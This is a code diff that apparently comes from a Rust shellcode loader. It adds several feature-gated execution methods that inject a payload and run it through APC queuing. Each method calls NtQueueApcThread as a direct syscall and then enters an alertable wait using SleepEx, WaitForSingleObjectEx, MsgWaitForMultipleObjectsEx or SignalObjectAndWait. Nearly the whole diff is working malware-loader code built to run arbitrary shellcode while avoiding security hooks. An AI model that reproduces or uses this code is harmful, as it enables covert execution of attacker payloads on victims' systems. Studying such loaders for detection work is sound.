@@ -1452,7 +1452,6 @@ fn alertable_function3() {
     unsafe {
         let mut h_event = CreateEventA(null(), 0, 0, null());
         if !h_event.is_null() {
-            // Wait for 30 seconds (30000 milliseconds) in an alertable state
             WaitForMultipleObjectsEx(1, &mut h_event, 1, 30000, 1);
             CloseHandle(h_event);
         }
@@ -1479,6 +1478,207 @@ pub fn shellcode_execute_waitformultipleobjectsexapc(payload: Vec<u8>) -> bool {
                 
                 // Enter alertable wait state to execute the APC
                 alertable_function3();
+            }
+            true
+        }
+        Err(_) => false,
+    }
+}
+
+// =======================================================================================================
+// EXECUTION METHOD: MsgWaitForMultipleObjectsEx APC   
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteMsgWaitForMultipleObjectsExAPC")]
+use windows_sys::Win32::{
+    Foundation::CloseHandle,
+    System::Threading::CreateEventA,
+    UI::WindowsAndMessaging::{MsgWaitForMultipleObjectsEx, MWMO_ALERTABLE, QS_KEY}
+};
+
+#[cfg(feature = "ShellcodeExecuteMsgWaitForMultipleObjectsExAPC")]
+use rust_syscalls::syscall;
+
+#[cfg(feature = "ShellcodeExecuteMsgWaitForMultipleObjectsExAPC")]
+fn alertable_function4() {
+    unsafe {
+        let mut h_event = CreateEventA(null(), 0, 0, null());
+        if !h_event.is_null() {
+            MsgWaitForMultipleObjectsEx(1, &mut h_event, 30000, QS_KEY, MWMO_ALERTABLE);
+            CloseHandle(h_event);
+        }
+    }
+}
+
+#[cfg(feature = "ShellcodeExecuteMsgWaitForMultipleObjectsExAPC")]
+pub fn shellcode_execute_msgwaitformultipleobjectsexapc(payload: Vec<u8>) -> bool {
+    match inject_shellcode(&payload) {
+        Ok(start_address) => {
+            unsafe {
+                // Get current thread handle
+                let current_thread: isize = -2; // HANDLE to current thread (pseudo-handle)
+                
+                // Queue the APC to execute the shellcode using syscall
+                let _status: i32 = syscall!(
+                    "NtQueueApcThread",
+                    current_thread,
+                    start_address,
+                    0usize,
+                    0usize,
+                    0usize
+                );
+                
+                // Enter alertable wait state to execute the APC
+                alertable_function4();
+            }
+            true
+        }
+        Err(_) => false,
+    }
+}
+
+// =======================================================================================================
+// EXECUTION METHOD: SleepEx APC   
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteSleepExAPC")]
+use windows_sys::Win32::System::Threading::SleepEx;
+
+#[cfg(feature = "ShellcodeExecuteSleepExAPC")]
+use rust_syscalls::syscall;
+
+#[cfg(feature = "ShellcodeExecuteSleepExAPC")]
+fn alertable_function1() {
+    unsafe { 
+        SleepEx(30000, 1) 
+    };
+}
+
+#[cfg(feature = "ShellcodeExecuteSleepExAPC")]
+pub fn shellcode_execute_sleepexapc(payload: Vec<u8>) -> bool {
+    match inject_shellcode(&payload) {
+        Ok(start_address) => {
+            unsafe {
+                // Get current thread handle
+                let current_thread: isize = -2; // HANDLE to current thread (pseudo-handle)
+                
+                // Queue the APC to execute the shellcode using syscall
+                let _status: i32 = syscall!(
+                    "NtQueueApcThread",
+                    current_thread,
+                    start_address,
+                    0usize,
+                    0usize,
+                    0usize
+                );
+                
+                // Enter alertable wait state to execute the APC
+                alertable_function1();
+            }
+            true
+        }
+        Err(_) => false,
+    }
+}
+
+// =======================================================================================================
+// EXECUTION METHOD: WaitForSingleObjectEx APC   
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteWaitForSingleObjectExAPC")]
+use windows_sys::Win32::{
+    Foundation::CloseHandle,
+    System::Threading::{CreateEventA, WaitForSingleObjectEx}
+};
+
+#[cfg(feature = "ShellcodeExecuteWaitForSingleObjectExAPC")]
+use rust_syscalls::syscall;
+
+#[cfg(feature = "ShellcodeExecuteWaitForSingleObjectExAPC")]
+fn alertable_function2() {
+    unsafe {
+        let h_event = CreateEventA(null(), 0, 0, null());
+        if !h_event.is_null() {
+            WaitForSingleObjectEx(h_event, 30000, 1);
+            CloseHandle(h_event);
+        }
+    }
+}
+
+#[cfg(feature = "ShellcodeExecuteWaitForSingleObjectExAPC")]
+pub fn shellcode_execute_waitforsingleobjectexapc(payload: Vec<u8>) -> bool {
+    match inject_shellcode(&payload) {
+        Ok(start_address) => {
+            unsafe {
+                // Get current thread handle
+                let current_thread: isize = -2; // HANDLE to current thread (pseudo-handle)
+                
+                // Queue the APC to execute the shellcode using syscall
+                let _status: i32 = syscall!(
+                    "NtQueueApcThread",
+                    current_thread,
+                    start_address,
+                    0usize,
+                    0usize,
+                    0usize
+                );
+                
+                // Enter alertable wait state to execute the APC
+                alertable_function2();
+            }
+            true
+        }
+        Err(_) => false,
+    }
+}
+
+// =======================================================================================================
+// EXECUTION METHOD: SignalObjectAndWait APC   
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteSignalObjectAndWaitAPC")]
+use windows_sys::Win32::{
+    Foundation::CloseHandle,
+    System::Threading::{CreateEventA, SignalObjectAndWait}
+};
+
+#[cfg(feature = "ShellcodeExecuteSignalObjectAndWaitAPC")]
+use rust_syscalls::syscall;
+
+#[cfg(feature = "ShellcodeExecuteSignalObjectAndWaitAPC")]
+fn alertable_function5() {
+    unsafe {
+        let h_event1 = CreateEventA(null(), 0, 0, null());
+        let h_event2 = CreateEventA(null(), 0, 0, null());
+
+        if !h_event1.is_null() && !h_event2.is_null() {
+            SignalObjectAndWait(h_event1, h_event2, 30000, 1);
+            CloseHandle(h_event1);
+            CloseHandle(h_event2);
+        }
+    }
+}
+
+#[cfg(feature = "ShellcodeExecuteSignalObjectAndWaitAPC")]
+pub fn shellcode_execute_signalobjectandwaitapc(payload: Vec<u8>) -> bool {
+    match inject_shellcode(&payload) {
+        Ok(start_address) => {
+            unsafe {
+                // Get current thread handle
+                let current_thread: isize = -2; // HANDLE to current thread (pseudo-handle)
+                
+                // Queue the APC to execute the shellcode using syscall
+                let _status: i32 = syscall!(
+                    "NtQueueApcThread",
+                    current_thread,
+                    start_address,
+                    0usize,
+                    0usize,
+                    0usize
+                );
+                
+                // Enter alertable wait state to execute the APC
+                alertable_function5();
             }
             true
         }
